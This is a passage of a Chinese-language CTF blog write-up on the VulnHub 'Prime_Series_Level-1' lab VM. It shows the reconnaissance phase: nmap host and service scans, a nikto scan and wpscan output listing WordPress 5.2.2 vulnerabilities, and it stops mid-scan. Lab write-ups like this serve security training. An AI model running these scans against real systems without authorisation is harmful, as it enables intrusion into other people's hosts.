<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-8217582216393706",
    enable_page_level_ads: true
  });
</script>
<!-- <br> -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Prime_Series_Level-1下载地址：点我 哔哩哔哩：点我 信息收集 下载完解压后导入虚拟机，发现是一个Ubuntu，还是桌面版的 把网卡设置为Host-Only，也就是vmnet1，网段为192.168.116.1/24  先nmap扫存活主机   12345678➜  ~ nmap -sn  192.168.116.1/24 Starting Nmap 7.80 ( https:/">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="Prime_Series_Level-1-Write-up">
<meta property="og:url" content="https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/index.html">
<meta property="og:site_name" content="Kali-Team">
<meta property="og:description" content="Prime_Series_Level-1下载地址：点我 哔哩哔哩：点我 信息收集 下载完解压后导入虚拟机，发现是一个Ubuntu，还是桌面版的 把网卡设置为Host-Only，也就是vmnet1，网段为192.168.116.1/24  先nmap扫存活主机   12345678➜  ~ nmap -sn  192.168.116.1/24 Starting Nmap 7.80 ( https:/">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-09-22T04:53:14.363Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Prime_Series_Level-1-Write-up">
<meta name="twitter:description" content="Prime_Series_Level-1下载地址：点我 哔哩哔哩：点我 信息收集 下载完解压后导入虚拟机，发现是一个Ubuntu，还是桌面版的 把网卡设置为Host-Only，也就是vmnet1，网段为192.168.116.1/24  先nmap扫存活主机   12345678➜  ~ nmap -sn  192.168.116.1/24 Starting Nmap 7.80 ( https:/">
    
    
        
          
              <link rel="shortcut icon" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=16">
          
        
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=192" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=180">
          
        
    
    <!-- title -->
    <title>Prime_Series_Level-1-Write-up</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/09/21/DC-8-Write-up/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/06/16/Vim开发环境搭建之Go/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&text=Prime_Series_Level-1-Write-up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&is_video=false&description=Prime_Series_Level-1-Write-up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Prime_Series_Level-1-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&title=Prime_Series_Level-1-Write-up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/09/20/Prime-Series-Level-1-Write-up/&name=Prime_Series_Level-1-Write-up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Prime-Series-Level-1"><span class="toc-number">1.</span> <span class="toc-text">Prime_Series_Level-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fuzz"><span class="toc-number">1.2.</span> <span class="toc-text">Fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#走正常流程"><span class="toc-number">1.3.</span> <span class="toc-text">走正常流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#非EXP提权"><span class="toc-number">1.4.</span> <span class="toc-text">非EXP提权</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Prime_Series_Level-1-Write-up
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kali-Team</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-09-19T23:09:46.170Z" itemprop="datePublished">2019-09-20</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Prime-Series-Level-1"><a href="#Prime-Series-Level-1" class="headerlink" title="Prime_Series_Level-1"></a>Prime_Series_Level-1</h1><p>下载地址：<a href="https://www.vulnhub.com/entry/prime-1,358/" target="_blank" rel="noopener">点我</a></p>
<p>哔哩哔哩：<a href="https://www.bilibili.com/video/av68476281/" target="_blank" rel="noopener">点我</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>下载完解压后导入虚拟机，发现是一个Ubuntu，还是桌面版的</li>
<li><p>把网卡设置为Host-Only，也就是vmnet1，网段为<code>192.168.116.1/24</code></p>
</li>
<li><p>先nmap扫存活主机</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sn  192.168.116.1/24 </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-20 07:16 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.1</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.132</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.54 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>找到IP为<code>192.168.116.132</code>，再扫开放端口服务。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -A -T4 192.168.116.132</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-20 07:17 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.132</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:<span class="built_in">cd</span>:4d:2d:4d:72 (RSA)</span><br><span class="line">|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)</span><br><span class="line">|_  256 4b:f6:f1:25:b6:13:26:d4:<span class="built_in">fc</span>:9e:b0:72:9f:f4:69:68 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: HacknPentest</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.13 seconds</span><br></pre></td></tr></table></figure>
<ul>
<li>发现开放了80端口，一般突破点在Web，浏览器打开看到只有一张图片。F12无果。</li>
<li>先上nikto扫一波。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto <span class="comment">--host http://192.168.116.132/</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          192.168.116.132</span><br><span class="line">+ Target Hostname:    192.168.116.132</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2019</span><span class="number">-09</span><span class="number">-20</span> <span class="number">07</span>:<span class="number">22</span>:<span class="number">14</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.18</span> (Ubuntu)</span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Web <span class="keyword">Server</span> <span class="keyword">returns</span> a valid response <span class="keyword">with</span> junk <span class="keyword">HTTP</span> methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ <span class="keyword">Server</span> leaks inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /icons/README, <span class="keyword">fields</span>: <span class="number">0x13f4</span> <span class="number">0x438c034968a80</span> </span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ Uncommon header <span class="string">'link'</span> <span class="keyword">found</span>, <span class="keyword">with</span> <span class="keyword">contents</span>: &lt;<span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.116</span><span class="number">.132</span>/wordpress/index.php?rest_route=/&gt;; rel="https://api.w.org/"</span><br><span class="line">+ /wordpress/: A Wordpress installation was found.</span><br><span class="line">+ 7535 requests: 0 error(s) and 8 item(s) reported on remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2019</span><span class="number">-09</span><span class="number">-20</span> <span class="number">07</span>:<span class="number">22</span>:<span class="number">26</span> (GMT8) (<span class="number">12</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
<ul>
<li>发现是一个Wordpress，可以格式化后查看一下有什么可以用的信息。从数据上看像是一个API接口的路由文档，详细去看一下：<a href="http://v2.wp-api.org/，既然是WordPress就用Wpscan测试下。" target="_blank" rel="noopener">http://v2.wp-api.org/，既然是WordPress就用Wpscan测试下。</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wpscan --url http://192.168.116.132/wordpress/</span><br><span class="line">_______________________________________________________________</span><br><span class="line">        __          _______   _____</span><br><span class="line">        \ \        / /  __ \ / ____|</span><br><span class="line">         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">          \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">'_ \</span></span><br><span class="line"><span class="string">           \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                       Version 3.6.3</span></span><br><span class="line"><span class="string">          Sponsored by Sucuri - https://sucuri.net</span></span><br><span class="line"><span class="string">      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.116.132/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Fri Sep 20 07:56:20 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.132/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.132/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.132/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.116.132/wordpress/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.116.132/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).</span></span><br><span class="line"><span class="string"> | Detected By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.132/wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.132/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] 6 vulnerabilities identified:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9861</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9862</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress 5.2.2 - Potential Open Redirect</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9863</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9864</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |      - https://fortiguard.com/zeroday/FG-VD-18-165</span></span><br><span class="line"><span class="string"> |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9865</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | [!] Title: WordPress &lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation</span></span><br><span class="line"><span class="string"> |     Fixed in: 5.2.3</span></span><br><span class="line"><span class="string"> |     References:</span></span><br><span class="line"><span class="string"> |      - https://wpvulndb.com/vulnerabilities/9867</span></span><br><span class="line"><span class="string"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222</span></span><br><span class="line"><span class="string"> |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/</span></span><br><span class="line"><span class="string"> |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentynineteen</span></span><br><span class="line"><span class="string"> | Location: http://192.168.116.132/wordpress/wp-content/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.4 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2019-05-07T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.116.132/wordpress/wp-content/themes/twentynineteen/readme.txt</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.116.132/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Nineteen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentynineteen/</span></span><br><span class="line"><span class="string"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Detected By: Css Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.4 (80% confidence)</span></span><br><span class="line"><span class="string"> | Detected By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.116.132/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: '</span>Version: 1.4<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==================================================================================================================================================================&gt; (21 / 21) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Fri Sep 20 07:56:22 2019</span></span><br><span class="line"><span 